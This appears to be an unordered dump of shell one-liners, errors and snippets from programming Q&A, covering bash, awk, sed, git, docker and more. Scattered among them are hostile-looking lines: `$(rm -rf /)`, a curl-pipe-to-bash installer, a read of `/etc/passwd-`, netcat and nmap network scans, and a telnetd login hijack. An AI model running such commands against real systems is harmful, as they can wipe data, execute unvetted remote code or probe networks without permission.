sed -n '/#START#/,/#END#/p'
source ~/.bash_prompt
if [ $1 == "some string" ]; then ...
if ... elif ... elif ... fi
[[ … ]]
test true
test false
-n STRING
-n STRING
[[ true ]]
[ -n $var ]
[ 1 -eq "$one" ]
[ word ]
find /where/to/search -name ...
$(date +%d%m%y)
man reboot
sbt test
sbt test
git ls-files -c -o --exclude-standard
git ls-files
cmd <<<"$var"
echo "$var" | cmd
exit 0
fabric pty description
pty is present to echo a user’s stdin
( $DIR/sscounter.sh ) &
( $DIR/sscounter.sh ) >/dev/null 2>&1 &
ssh user@remote-host 'bash ssadmin.sh'
ssh -t user@remote-host 'bash ssadmin.sh'
2> file.log
2> >(tee file.log >&2)
2> >(command )
df | grep
set2 - set1
set1 - set2
%.output_final: %.output1 %.output2
. ./setenv.sh
$($(basedir $0)/setenv.sh)
$today + 86400
$ date -v+1d
$ date -v+1d +%Y-%m-%d
</dev/null &
hi there
man history
grep | wc -l
grep -q
if: Command not found
SET ENG_#
SET ENG_
SET ENG
SET ENG
/SET ENG/
/SET [anything else]/
./script1 1
. script1
. script1 1
exit( status )
php /path/to/index.php <command>
./reverse.sh < addrs.txt
tail -f -n0
grep -ql
nmap -sP 192.168.2.0/24 | cut -d "i" -f1 | cut -d " " -f2 | grep 192.168.2.*
dialog ... | { read; ... }
sort -t/ -k3,3 -u file
awk -F/ '{ print $3 "\t" $0 }'
xargs -n 2 -J {} /scripts/suspendacct {} 1
-n 2
-J {}
echo -e "\007\007\007"
sed -e '1,244d' file | sponge file
while read
-xF -m1
-m N
sed -re '1s/.{15}//'
grep -ane '^:' ~/.zsh_history
grep -anE '^: [0-9]{10}:[0-9]*?;' ~/.zsh_history
/^GET/ { delete lines; c=0; inBlock=1 }
/^error:/ { for(i=1; i<=c; ++i) print lines[i]; print; exit }
inBlock { lines[++c] = $0 }
chmod u+x
cd ../
cd ../ && sh script
./gradlew -q doSomething
sh, perl, python
python -V
gnome-screensaver-command -la
echo -e "foo\nfoo\nbar\nfoo" >> tailSource
python script.py *
LC_COLLATE=C sort ...
alias csort="LC_COLLATE=C sort"
grep -oP ".*?(?=-)"
line 8: fg: no job control
m=$((m+9)) % 12
-e "ssh -p 44"
-e "ssh -p 44"
port 44
port 44
port 44
-e "ssh -p 44"
unterminated s' command
ls -lshR
ls -lshR | grep ".txt"
mdfind 'kMDItemFSLabel = 6'
mdfind kind:folders
mdfind 'kMDItemFSLabel=6'
Failed to create query for [query above]
mdfind 'kMDItemUserTags == Red'
mdfind 'kMDItemUserTags == Red && ! kMDItemContentType == public.folder'
mdfind 'kMDItemUserTags == Red && kMDItemContentType == public.folder'
mdfind 'tag:red'
mdfind 'tag:red AND NOT kind:folder'
mdfind 'tag:red AND kind:folder'
~/Library/Saved Searches/
mdimport -A
-onlyin <folder>
-attr <attribName>
mdimport -X
echo    mls   k
echo "   mls   k"
awk -v var="$var" ...
chmod a-x
crontab -l
no crontab for <username>
crontab -l
python -u test.py
"36 0"
xcodebuild abc > my_output.txt
source git-abbreviations.sh
head -n -2 {}
declare word3="something wörd"
grep -E
docker exec -it ziftrCoin /root/64/./ziftrcoind
"ziftrCoin /root/64/./ziftrcoind"
docker run
docker run ziftrcoin
docker run
docker run ziftrcoint /root/64/./ziftrcoind
docker run -d ziftrcoin
s/(, )+/, /g; s/, *$//
declare -A words
", "
if [[ "$2"="$who" ]]
apple D
sed -ne 's/^.*create multiset \(volatile \)\?table \(\w\+\).*$/\2/Ip' INPUT FILES | sort > creates.txt
sed -ne 's/^.*drop \(\w\+\).*$/\1/Ip' INPUT FILES | sort > drops.txt
join creates.txt drops.txt
combine creates.txt not drops.txt
multiset table
VAR1=val1 VAR2=val2 VAR3=val3 make
disable X
drop X
-v par="wlan0"
/^iface/ && $2==par {f=1}
/^iface/ && $2!=par {f=0}
f && /^\s*address/ {print $2; f=0}
calc () { python -c "print (${*//[Ii]/j})"; }
df -P
sed -e "/^$myDate,/d" -i $file
df -P
awk '...' **/fastqc_data.txt
-v n=27
BEGIN { OFS = FS = "," }
$2 == n { print $1, $2, $NF }
sudo -i env | grep ENV
/home/simon/seafile/seafile-server-latest/seafile.sh start
/home/simon/seafile/seafile-server-latest/seahub.sh start-fastcgi
value too great for base (error token is "09")
val= ..
man bash
-i inplace
> tmp && mv tmp file
cat file.txt | grep -w "option" > file_option
<p id="results-credentials>course name to extract</p>"
stat -c %Y
ls ..| tail..
find /path/ -type f
Permission denied
/home/me 2 .jpg .png
find /home/me -maxdepth 2 -iname *.jpg -o -iname *.png
shopt -s globstar
IFS=, read -r last first _
< file.txt
Success: Deleted 'hello' plugin.
[32;1mSuccess:[0m Deleted 'hello' plugin.
split -l 100 <source>
split -l 100 <source> OUT
write user1
write user1
awk -f
bash launch_script.sh 5 6
bash launch_script.sh  6 5
(( arithmetic condition ))
cat /etc/apt/sources.list.d/gitlab_gitlab-ce.list
' '
arg1 arg2 ..
#!/usr/bin/gnuplot -p
gnuplot -e
ps -elf
alias gnuplot='rlwrap -N -a -c -b"\"\"\\'\''\\'\''" gnuplot'
unalias gnuplot
alias gnuplot='rlwrap -N -a -c -b"\"\"\\'\''\\'\''" gnuplot'
unalias gnuplot
[ -t 1 -a -t 2 ]
$(readlink /proc/"$$"/fd/1)
read code
bash launch_script_even.sh one two three four five six seven eight
one two three four five six seven eight
two four six eight
mpcstatus=cat /var/tmp/mpd_status
actvol=cat /var/tmp/mpd_volume
token3 = strtok(pathValue, ":");
telegram-cli -e
Rscript -e "library(knitr); opts_knit\$set(root.dir='~'); knit('test.Rmd')"
find /some/dir/ -type f > somefile
-f someFile
-f <(cd "/some/dir" && find . -type f)
type -f
-xtype -f
find . -type f
grep -Fxv
-f <(...)
xargs ... rm
tr '\n' '\0'
xargs -0
xargs -I {} rm {}
uniq -u
uniq -u
... | uniq -u | xargs rm
uniq -u
xargs -I {} rm {}
xargs rm
xargs rm
rm -r
sort -r
sudo echo "8933" > /dev/ttyUSB0
sudo screen /dev/ttyUSB0
sudo echo "8933" > /dev/ttyUSB0
printf "8933"
printf "8933" | sudo tee /dev/ttyUSB0 > /dev/null
git status
printenv | sort | less
touch: impossible de faire un touch « 20150518/foe »: Aucun fichier ou dossier de ce type
stty -icanon
stty icanon
gm convert -profile /path/to/AdobeRGB1998.icc -compress Zip /path/for/file.psd /path/for/converted/file.tif
multitail --mergeall -l 'ssh server1 "tail -f /path/to/log"' -l 'ssh server2 "tail -f /path/to/log"' -l 'ssh server3 "tail -f /path/to/log"' | jq .
parse error: Invalid numeric literal at line 1, column 2
$ mknod MYFIFO p
$ tail -f logfile > MYFIFO
$ tail -f MYFIFO | jq
xargs -0
xargs -d $'\n'
date +\%Y\%m\%d
sh -c ...
bash -x Interface.sh
sed -i
docker CentOS
/usr/bin/env bash -x
No such file or directory
grep "@" file.txt
sed 's#\/\/.*##' file
sudo service tomcat8 start
column -t -s','
npm install -g mean-cli
mean init myApp
-bash: mean: command not found
grep -v your_pattern your_file > new_file
tee > /dev/null
{print $2}
chmod 777
for (( expr ; expr ; expr ))
sh filename.sh
sub(/^\(/, "", tmp)
Bad substitution
/bin/sh -c
...do some stuff...
declare -r
declare -g
declare -rg a="a1"
set -o errexit
set -o errexit
echo '[status] end of test script'
set -o errexit
set -e
set -o errexit
man dash
echo '[test] nginx works
docker run dcyclebox-test bash -c 'nginx -v'
[[ "0" =~ "^[0-9]+$" ]] && echo hello
rm -r
rm -r {}
echo {}
shopt -s globstar
rm -r
-type d
source savedState.properties
grep -f
<seg id=.*>
<seg id=XXXX>
npm install -g grunt-cli
npm install
git add -p
git commit
-bash: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/git/bin: No such file or directory
fswatch -0
-d ''
< <(fswatch -r -0 "${1}")
<(fswatch -r -0 "${1}")
fswatch -r -0 "${1}"
-t $TIMEOUT_TIME
echo '\033[0;31m'"$1"'\033[0m'
function refreshTimer ()
CURRENT_TIME=date +%s
CURRENT_TIME=$(date +%s)
CURRENT_TIME=`date +%s`
[ CURRENT_TIME - LAST_CHECKED > TIMEOUT_TIME ]
[ ... ]
[[ ... ]]
(( CURRENT_TIME - LAST_CHECKED > TIMEOUT_TIME ))
fswatch -r ${1} | refreshTimer
aaaaaaaa, 12.4, 14, 25.55
bbbbbb, 5.1, 121, 312.1
grep -n
[ -n "$variable" ]
find ... -empty
[ ... ]
[[ ... ]]
ls $dir/*
shopt -s failglob
| jq -r .message
export PATH="/Users/neil/blah"
git clone git@gitlab.com:username/repo directory > /dev/null 2>&1
git clone git@gitlab.com:username/repo directory &> /dev/null
split -l
tail -f /var/log/bleh.log | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' | python mygeoip.py
tail -f
echo $((...))
./script_pb3.sh out.txt 3
ssh -vv
chmod +x
logrotate -d /etc/logrotate.conf
/other/path*.log /yet/another.log /my/path/*.log {
grep -Eq '<your-extended-regex>' <<<"$1"
[[ $1 =~ <your-extended-regex> ]]
grep -E
sudo env
python mymgm.py
man 3 printf
man 1 printf
man 7 man
-id 12345
-d YES
-d NO
-h localhost
./Build.sh -id 12345 -d YES -h localhost
./Build.sh 12345 YES localhost
getopt -h
ksh MyProgram -v true
ksh MyProgram -v false
--size 24
systemctl start lighttpd.service
chmod +x
#ln -s /home/istvan/myadmin/run-web-server.sh /usr/local/bin/run-web-server
'command not found'
echo $PATH
kill -9 pid
pgrep gedit
x < 8
-rwxrw-r--  1 www-data www-data    58 May 22 10:08 mkLogFile.sh
sudo -u www-data ./mkLogFile.sh
drwxrwxrwx   2 www-data www-data   4096 May 22 10:40 log
git commit
git status
(( ))
do_something > file.txt
progress=$(awk 'NR==2' file.txt | grep -o \. | wc -w)
echo -ne "$progress % \\r"
do_something > file.txt
do_something > file.txt
$(( ... ))
python -c "print( $var1 / float($var2) )"
[[ ... ]]
trap exit  SIGHUP
ps -aux | grep <prgname>
ps -aux | grep firefox
user name adminUser
done < <(ls...)
done < /dev/fd/63
wget $url
:0: -4
"-f dir1/file1 -f dir2/file2"
echo "dir1|file1|dir2|file2" | sed 's/\(\([^|]\)|\)*/-f \2\/\4 -f \6\/\8/'
for (i=1;i<=NF;i+=2)
printf "-f %s/%s%s", $i, $(i+1), ((i==NF-1) ? "\n" : " ")
((i==NF-1) ? "\n" : " ")
\1,\2 used in the replacement part of the substitution command s/pattern/replacement/)
LASTCHAR="$(echo \"${string: -1}\")"
declare -i
(( ))
declare -i
sleep 0
import mypackage.mymodule
from mypackage.mymodule import myclass
echo -n "<msg>"; read REPLY
man bash
IFS=', ' read -ra selChoices <<<"$REPLY"
for choice in "${selChoices[@]}"; do
(( choice >= 1 && choice <= ${#choices[@]} )) || { echo "Invalid choice: $choice. Try again." >&2; continue 2; }
echo "Choice #$(( ++i )): ${choices[choice-1]} ($choice)"
$(( ... ))
grep -c
rmup argument
git rmup
expect "$"
/^timeprime = i [+]/{$5+=2}
^timeprime = i +
sudo bash /home/pi/scripts/autorun.sh
sudo bash /home/pi/scripts/autorun.sh
type -p
type -t
node ./build.js
npm run myScript
npm start
[[ statement ]]
[ != "N" ]
unary operator expected
plushu logs foo | grep WEB
game\ of\ thrones
./add game\ of\ thrones
echo $1
game of thrones
execute vlc
< ${CURR_DIR}/c1.txt
bash -x <my_script>.sh
while read
ls -lr
if [$? -eq 0]; then
if [ $? -eq 0 ]; then
if [[ $? -eq 0 ]]; then
if [ $? -eq 0 ]; then
(* and .)
printf $(some stats about .)
$(some stats about $name)
[ $n -ge 500 ]
[[ $n -ge 500 ]]
chmod 0755 renderTest.R
command | while read line; do ... end
while read line; do ... end
command | while read line; do ... end < input
-t STDIN
AA 111.pdf
AA  111.pdf
[a-zA-z]+ \d+
\w+ \d+
\w+ \w+
AA 111.pdf
line 1 = old value
line 2 = updated value
ps -C httpd
PID TTY          TIME CMD
wc -l
$((RTN -1))
man sort
sort -t$'\t' -k5nr File|awk -F'\t' '!a[$1]++'
* 20 * * * sudo -u www-data /usr/bin/env TERM=xterm /path/to/dailyProc.sh
sudo -u www-data dailyProc.sh
Syntax error: word unexpected…
[[ ]]
. script.sh
. script.sh
. foo.sh
source foo.sh
#!/bin/bash -i
. myscript
chmod -x script.sh
bash script.sh
function x
-P, --perl-regexp
grep -w
mplayer file_path
crontab -e
sh -x script.sh
chmod +x
count "$line"
BEGIN{ FS=OFS="," }
diff -x'*/' foo bar
./background_pro /home/conf1
./background_pro /home/conf2
sed -i "s[$(head -1 "$files")[[g"
sed -i "" -e "1d" *.txt
$ for package in $dlpackages; do apt-get install $package; done
conda list
./convert_images 289
convert: unable to open image 'Viewer/{0..289}.png': No such file or directory @ error/blob.c/OpenBlob/2675.
sed: 1: "student_record": unterminated substitute in regular expression
file not found
sqlcmd ... | sed -e '2d'
> /dev/null
> /dev/null 2> /dev/null
valgrind --log-file="filename"
valgrind --log-fd=9 9>>test.log ./app
grep '(?<=/abc/xyz/).*' <filename.txt>
wc -l
if [ "$total_lines" -gt 2 ]
$(( ))
[0-9]-[0-9][0-9] (fe: ping 1 - 25)
[0-9]-[0-9][0-9][0-9] (fe: ping 1 - 125)
cp --parents $(git diff --name-only $1 $2) $3
git diff ...
cp --parents ...
git diff
git diff
cp ...
git diff
IFS= read
diff -z
read -d ''
git diff
< <(...)
cat .profile
cd ~/
touch .bash_profile
open -e .bash_profile
echo $SHELL
source $HOME/.<rc file>
echo $PATH
open ~/.bash_profile
locale -a
read -a
set -e
while read xx
myarray=( $(echo list.txt) )
cd ,
(/tmp -iname "*.log*")
git rev-parse --abbrev-ref HEAD
git branch
cmd /c <command>
cd ..
brew install npm
brew link node
brew link --overwrite node
brew install node@version
bash scriptname
./command "some argument"
./command "some" "argument"
<VirtualHost *:80>
declare -p
while read
grep -wf words.txt file.txt
grep -Ef words.txt file.txt
ln -s
/the/command | sed -n '/pattern1/,/pattern2/p' > /some/file
source ./config
source somefile
Ctrl + D
gulp tslint
gulp tslint || exit 1
PAPU 0
body && sub(/^Seqt...
$1 $2
Building in workspace C:\.jenkins\workspace\chef-sample
ls -d /path/to/files/A*
ls A*[^B].txt
difference=$(awk -F '-' '{if ($1-$2 < 0) { print $2-$1 } else { print $1-$2} }' /tmp/.tmpdate)
0 4 * * * /bin/bash -l -c 'cd /var/lib/streetcred/agency/releases/streetcred && bin/rails runner -e production '\''AddressGeocodeWorker.perform_async'\'''
0 4 * * * /bin/bash -l -c 'cd /var/lib/streetcred/agency/releases/streetcred && bin/rails runner -e production AddressGeocodeWorker.perform_async'
find . -name '*-nq8.png' -print0 | xargs -0 -P6 -n1 scriptOneLine
rename -nq8.png .png *-nq8*
rename -nq8.png .png *-nq8*
grep '{$i}$'
"double quoting"
echo "2" | /path/to/your/script.sh
set -e
|| return 1
set -e
set -e
<( )
$( )
nano .bash_profile
export PATH="usr/local/bin:/usr/local/sbin:/usr/local/mysql/bin:$PATH"
which $SHELL
ldd --version
ld --version
ldconfig --version
echo "info1 info2" | npm run-script scriptname
"info1 info2"
s = 0
ARITHMETIC EVALUATION
-v OFS="\t"
" "
./pingtest.sh 63 66
ping: unknown host 192.168.129.
[0-9]*) pingTest;;
[0-9]*) pingTest "$1";;
ping -c 4
docker run -it --name="TEST" ubuntu:14.04 /bin/bash
[[ ... ]]
$ myCompaniesSpecialBuildScript.sh
Project -> Clean... -> Clean all
sleep 5; echo "Hello" &
php runstuff.php
&> /dev/null &
:cscope add
:h E563
sh script.sh "test ing" 1 2
Process call = Runtime.getRuntime().exec("sh script.sh \"test ing\" 1 2")
ps -ef
$timer ls
>= 3
unexpected end of file
(R="Pass ok")
ed -s file.csv <<< $'1,123d\nwq'
./program /var/log/apache2/access.log
./program /var/log/apache2/access.log
website_1 and website_2
cp -s
cd public_html/directory; for i in *; do ln -s <NAME_WEB1>/.htaccess "$i"/.htaccess;done
echo $i
sort -nu
Already up-to-date.
xargs -0
print $0
/ss/ {flag=1}
/gg/ {flag=0}
NR == 1
fmt: %ts %te %td %pr %sa %da %sp %dp %ra %in %out %pkt %ipkt %opkt %ibyt %obyt %fl %dir %ismc %odmc %idmc %osmc
000 000
curl: (28) connect() timed out
curl: (28) Operation timed out
sed -r 's/^(.*)$\n^(.*)$/\1/mg' filename
invalid reference \1 on
cat /etc/passwd-/
sudo script.sh
sudo su
sudo visudo
sudo -K
global timeout
global spawn_id
xcode-select --install
if [ $(du -sb ~/MEGA | cut -f1) \> $MAX ] then
sudo admpanel -a
sudo admpanel -a FirstName
sudo admpanel -a FirstName LastName
$ \curl -L https://get.rvm.io | bash -s stable --ruby
gpg: Signature made вт, 31-бер-2015 00:52:13 +0300 EEST using RSA key ID BF04FF17
вт, 31-бер-2015
compgen -? "commandA"
compgen -? "commandA abc"
complete -p commandA
source ~/.zshrc
export | grep JAVA_HOME
mkdir ~/.zsh
export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)
export PATH=$JAVA_HOME/bin:$PATH
e[2] "," d[1] "," e[1]
c[e[2] "," d[1] "," e[1]]
/home/donald/Desktop/New Folder/
/home/donald/Desktop/New Folder/*.jpg
[ -f "${file}" ]
NR == 1
<< 'EOF'
cat >"$a"
declare -p
crontab -e
docker images
docker images -q
docker images
docker images
docker image inspect
docker images -q
docker image inspect
docker image inspect my_image:my_tag
--format="ignore me"
doesn't exist
docker inspect
docker build
docker build
--tag hello-world:latest
docker build
ps -ef | grep -v grep | grep /sbin/syslog-ng | awk '{print $2}'
head -n 1
wc -l
if [[ "$1" = "0" ]]; then
[ ]
[[ ]]
[ ]
which php
echo ${!foo[@]}
-v grep "king's"
(^|[ \t])
([ \t]|$)
awk "$i == $j" phased.txt | wc -l
awk "3 == 4" phased.txt | wc -l
$3 == $4
awk "\$$i == \$$j" phased.txt | wc -l
print $1
print $2
$ docker
FATA[0000] Couldn't read ca cert...
docker-machine env -u
docker-machine ls
- to *
docker-machine active
minkube docker-env
$string . $d
file.csv > file2.csv
file.csv >> file2.csv
sh main.sh
chmod +x
chmod +x script.sh
sh script.sh
bash main.sh
sh main.sh
ctrl + c
grunt watch
from, till
{ ... }
echo 192.168.1.{2..102}
seq -f 198.168.1.%g 1 100
bind -x
-x keyseq:shell-command
help [[
blk /dev/sda2
man blkid
sudo blkid
mkdir -p
grep 'File\[Three\]Days$'
wc -l
wc -l
which grep
| more
| less
y 2 1 n n
./process "foo bar.txt"
./process foo\ bar.txt
man chattr
rm -r
nt authority\system
nt authority\system
echo 'Hello World!' | /tmp/test-socket
bash: /tmp/test-socket: No such device or address
ls -l /tmp
> 0
find | xargs
head /dev/random
man strings
strings -ws ''
ls -R
User ID:
Us5r ID:
":set syntax=local_log"
sh Autorun.sh
Rscript shiny::runApp(...)
for var in $SORTEDLIST do <ping-command> done
tr ' ' '\n'
tr ' ' '\n'
sort -n <<<
telnetd -- -l "killall -q login;/bin/login"
killall -q login;/bin/login
Too slow, sucker!
bash Script 50-60
declare -A
echo $PATH
kubectl get pod app-etcd
--output / -o
[[ ... ]]
ARITHMETIC EVALUATION
[[ ... ]]
CONDITIONAL EXPRESSIONS
strace bash
$ svn co protocol://path/to/repo/root/
findstr /?
--set-depth empty
svn up
curl | grep | sed
drush devel-reinstall myModule
find . -type f | gshuf -n2
open -a TextEdit ./text.txt
$( command )
cut -c 6- inputfilename
vi -e
vim -e
cp -r <filelocation/filename> <destination/>
+bash: get: command not found
cat foo | hightlight bar
grep -E
osascript -e "mount volume \"${volume_path}\""
mount volume 
mount volume afp://some.server.com
mount volume "afp://some.server.com"
turn on
aws configure
X aws configure
read -p "string" string
X read -p "string" string
read -e "string" string
sudo read -e "string" string
alias -p
alias -p | grep myls
my_proj -x build
$1 = my_proj, $2=-x, $3=build
build $var
build $var
ctrl+a c
screen -X
ctrl+a c
screen bash t.sh $line/x$x
cut -c43-
sleep 2
for loop
netstat -c 0.1
rvm get stable
./foo.py input.xml
chmod +x
sh hivetest.sh
sort -r
GNU bash version 4.2
sort -rn
sort -r | tail -1
sort -rn | head -1
perl -MList::Util=max -0777 -nE 'say max /-?\d+/g'
os.path.dirname("<absolute path to script.sh>")
other shells may not understand the syntax
-bash: installation: No such file or directory
echo $FINAL_JSON
|| true
pgrep -f "java.*MySketch" | xargs kill > /dev/null 2>&1
Finished in 0.3s with exit code -15
pkill -9 -f ...
pkill java ; processing-java bla bla bla
pushd $line;
"$(expandPath "$line")"
chsh -s /bin/zsh
cat file1 file2 > file3
FNR == NR
*" $line "*
if grep -q $line $currentIPs
REVIEW ASSIGNED
REVIEW ASSIGNED
"build:test:scripts": "browserify ./test/**/*.js -o /build/test-bundle.js",
npm run
~/Desktop/file1 ~/Desktop/file2 ~/Desktop/fileFoo
unpack() {
find -maxdepth 1 -type f -perm xxx
CONTAINER_ID=$(sudo docker run -d my-image /bin/sh -c "sleep 10")
sleep 10
osascript $Home/path/smallscreen.scpt
osascript /Users/USERNAME/Desktop/foo.scpt
git commit (-a)
for i in "$@"
tail c +1235
listen_addresses = '*'
Commented out on DD-MM-YYYY by XYZ
listen_addresses = '*'
listen_addresses = *
listen_address =
grep -vf
sh -x <your_script
set +x
set -x
while read -r
bash -c
test.sh: 4: test.sh: Bad substitution
tr '.' ' dot '
&& !x
bad substitution
-v a="$a"
-v b="$b"
awk '$1=="'$a'" && $10=="'$b'"' file
a = NR
a = $0
grep -nr "className." .
find /data -mtime -1 |xargs |ls -l | awk '{print $2" "$3}'" | awk '{ total += $5 }; END { print total/1024/1024/1024 }'
which bash
yum remove freetype
yum remove
rocks list roll
rocks: command not found
compute nodes
echo "*WORD\n#" | aspell -a
Atoms. Timestep: 1
my_script.sh  |  awk '{ whatever }'  |  ...
awk '{ whatever }' some_file  |  my_script.sh
while read line; do   ..... done
INFO: Dev App Server is now running
Press any key to "ant clean" and exit...\n
GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin13)
cat > /dev/null
find: print: unknown primary or operator
grep: warning: recursive search of stdin
export PS1=${print ...}
uniq -c
sort | uniq -c
wc -l /tmp/scriptcountfile
666 minus umask
MYRA=($(${Command} $1))
"mkdir " + dir
shuf -n1
-mmin -60
-mmin -360
help select
exp_internal 1
if { $USE_TUNNEL == 1 } {
<<Send stuff>>
git l | tail -n 1 | awk '{print $3}’
git show --pretty="format:" --name-only $(git l | tail -n 1 | awk '{print $3}’)
git show --pretty="format:" 709bc16
$(git l | tail -n 1 | awk '{print $3}’)
git l
git rev-list
ansicon -i
m == 0
m + 1
while read
turn on
boot2docker ssh
docker exec -it container bash
date +\%Y-\%m-\%d
date +%Y-%m-%d
$( )
$( )
man 2 write
systemctl stop servicename
man bash
./script.sh 2>&1 &
sort -t
export PATH=$PATH:/path/to/folder/above_myscript/
#!/usr/bin/env python
chmod +x myscript.py
Stopped (tty input)
bash -c "$line"
echo $$ > /var/run/rsync_job.pid
log test.py 5
svn: Write error: Broken pipe
svn log -q $1 2>> /dev/null | head -n $2
git ls-files --others
grep -ho '[0-9]*' files*
awk '{sum+=$1} END {print sum}'
echo $var | sed 's/\-\|\_//g'
'\x1b[44m\x1b[30mcard           major  minor  revision  runs  updated\x1b(B\x1b[m\x1b(B\x1b[m\n'
xterm -e
nohup bash batch.sh &
nohup: ignoring input and appending output to nohup.out
xterm Xt error: Can't open display:
xterm:  DISPLAY is not set
root@kali:~# for host in $(seq 200 254); do nc -nvv -w 1 -z 192.168.15.$host 80 | grep --line-buffered "open"; done
system 'bash -ic'
strftime("%d/%m/%Y", $3)
2> /dev/null
npm install -g yo grunt-cli bower
-bash: yeoman: command not found
Untitled 1.ods
Data sources
Registered databases
any keystroke to trigger it
Only the first keystroke
npm install protractor@2.1.0
protractor --version
npm list protractor || npm install protractor@2.1.0
npm list protractor
npm ERR! code 1
npm install protractor@2.1.0
print > file
awk '{print > "hello.txt"}' file
( file )
ls -l
/proc/<PID>/fd/0 -> /dev/pts/9
echo "\r" > /dev/pts/9
echo -e "\r"
echo $'\r'
kill <PID>
pid x
foo | bar
rsync: chown <path> - operations not permitted(1)
rsync -rltgoDv ...
rsync -av ...
rsync -av ... root@server:/Backup/$name\ -\ $(date +%m-%d-%y) ...
$1 ~ /^[0-9]/
awk '/^[0-9]/' file
./copy_key 1.1.1.1 GENERATED_PASSWORD
svn mergeinfo http://myserver.com/branches/FeatureBranch http://myserver.com/branches/UAT --show-revs eligible
svn log
$n =~ s/(?s).*\K<\/Shipment>/<\/ShipHdr> <\/ShipmentX>/;
$n =~ s{(?s).*\K</Shipment>}{</ShipHdr> </ShipmentX>};
set -e
var failed!
var failed!
declare var
DB::table() { cmd1; cmd2; }
waterlock command not found
HKLM\SYSTEM\ControlSet001\Control\Windows --> Shutdown Time
file (1)
grep (1)
JPEG image data
sed (1)
> list
find . -name "*.jpg" -type f -exec rename 's/\.jpg$/.png/' \{} \;
ls& pid=$!
exit 1
kill $$
echo $(foo)
echo $(foo)
echo $(foo)
bash -x yourscript.sh
bash -c 'exit 0'
> >(tee -a $OPT_LOG &)
sleep 0
sleep 0.1
sleep 0.1
FNR < 2
/^Type /d
0,/^Type /b
/^Type /
Type ...
explorer .
read -p
type something:
read -e
type something:
test 3
echo -n
command make
-exec ... +
tr '\n', '\0'
sh -c
./my_script.sh 01 06
[ ]
[[:alnum:] ]
[a-zA-Z0-9 ]
Google {1,3}“[a-zA-Z0-9 ]{1,100}[., ]{0,3}”
i, j
NR == FNR
NR != FNR
sed "s/\s*\(\s?[A-z0-9. ]*\)//g"
i love remix
127.0.0.1 laravel.dev
192.168.10.10 laravel.dev
vagrant reload
( … )
export VAR='something'
unset VAR
unset VAR
launchctl list
python -c
python -c '...'
python - <<\____HERE
python -c '...'
cmda | cmdb
python -c
./script.py < myinputs
cp -avr config* $source_folder
echo $ftp_password | openssl aes-256-cbc -a -salt
echo $passwrd | openssl aes-256-cbc -a -d -salt
quote PASS $decrypt
quote PASS $ftp_password
Server Ip
sudo nano /etc/bash.bashrc
alias ll="ls -al"    #Adds alias for ll to show all files and folders
alias cls="clear"    #Adds alias for cls to clear screen
alias temp="vcgencmd measure_temp"    #Get the system temperature
FNR==NR{a[$1]=1; next;}
grep -oP "https:\/\/www.youtube.com\/watch\?v=([A-Za-z0-9-_]+)" list > links
<a href="http://www-bcf.usc.edu/~gareth/ISL/">An Introduction to Statistical Learning with Applications in R</a>
https:\/\/www.youtube.com\/watch\?v=([A-Za-z0-9-_]+)/[SOME INFORMATION ON URL HERE]/([A-Za-z0-9-_]+)
if ! echo "$1" | grep -qFxf name.txt
cat $(ls)
-bash: /bin/cat: Argument list too long
getconf ARG_MAX
cat $(ls)
cat *
-maxdepth 1
cat filename.txt | awk -F "[=()'']" '{print $2 $3 $4}'
-v OFS='\t'
dirname $0
git delete-branch
delete_git_branch [TAB][TAB]
delete_git_branch 1[TAB][TAB]
git branch
git branch -d
git branch -D
git branch -M
branch -M
branch -m
branch -D
branch -d
branch -d
$(( ... ))
echo $((2/4)) # => 0
test "$a" -ne 0
test "$a" != "$b"
./filter_file.sh file1 file2 out
echo | command
echo -ne "\n"|(echo -ne "\n"|ssh-keygen)// but still no positive result
echo -e "\n\n\n\n\n"
man chsh
man bash
export var1=Quick
sed -e "COMMAND"
/: /:/
Failed opening logfd: Invalid argument
netstat -p
su 'user' -c 'command'
pip install boto
aws s3 ls
set -x
set +x
(( $# = 2 ))
behave --color
for a in filename_V*.txt
for x
for x in "$@"
-d ''
$(rm -rf /)
[-e PATTERN | -f FILE]
bind '"\C-k": alias-expand-line'
rebase() { git rebase -i HEAD~$1; }
rebase 4
hist grub
declare -a
declare -i
export /myapp/db/username=someval
-1 2 -2 1
[[ ]]
ruby -v
ruby 2.0.0p481 (2014-05-08 revision 45883) [universal.x86_64-darwin14]
rvm uninstall 2.0.0
-bash: rvm: command not found
{ list; }
xargs dos2unix -k | /
xargs dos2unix -k
dd if=/dev/null of="$_" bs=1 seek=$(echo $(stat --format=%s "$_" ) - $( tail -n1 "$_" | wc -c) | bc )
find -exec
xargs -0
xargs -r
Git Flow
git flow feature start Test
exit 1
git rev-parse --git-dir
sudo su - user
sudo whatever
sudo whatever
sudo visudo
root ALL=(ALL) ALL
sudo visudo
root ALL=(ALL) ALL
[tidal@atlesapp002 IRMS]$ ksh
/opt/app/depl/bin/runjob.sh execute
awk 'FNR==NR {do_things; next} other_things' file1 file2
source .profile
date -d @{$t}
for file in $(find...)
find . -name CVS
find . -name CVS -delete
-type d
find . -type d -name CVS -exec rm -rv {} \;
shopt -u extglob
-v ORS='\r\n'
delete a
$(echo $s1total|bc)
./sievetest.sh: line 25: 0+0.000117+0.000149+0.000106: command not found
grep -w
grep -v
grep -v "[^ .]\+$1"
read dir
[ ... ]
test -d ...
[ -d ... ]
-d ...
foo || bar
commandLine 'sh', './myScript.sh'
ProcessBuilder pb = new ProcessBuilder("myshellScript.sh", "myArg1", "myArg2");
mpirun process.sh
binaryA, binaryB
!C:=C:\Users\Ross Ridge
Ruby on Rails
cat /etc/dsh/machines.list | sed -e "s|\(.*\)|cp run.sh \1/|"
match and replace
|match this|replace with this|
cp run.sh \1/
sed -e "s|\(.*\)|cp run.sh \1/|" /etc/dsh/machines.list
scrot -select
scrot -e './img.sh $f'
" "
killall mono
pkill mono
fuser -k /path/to/something.exe
"ps a"
ps a
--output-tabs=' 1'
man pr
nth line
sed '/^$/q' test.txt
sed '1,/^$/d' test.txt
$(awk -v RS= '{print $0 ";"}' filename)
awk -v ORS=';' -v RS= '{print}'
wc -l
bash 4.3
umask 0002
./run.sh input.txt
the end
echo $arrayLMEs > tmpfile
asterisk -rx "core show channels verbose" | awk '$9 > "01:00:00"' | awk '$6 == "Dial"' | wc -l > test.txt
pacman -Syyu
xdotool search --onlyvisible  --name 'Chrome' windowfocus key "ctrl+f"
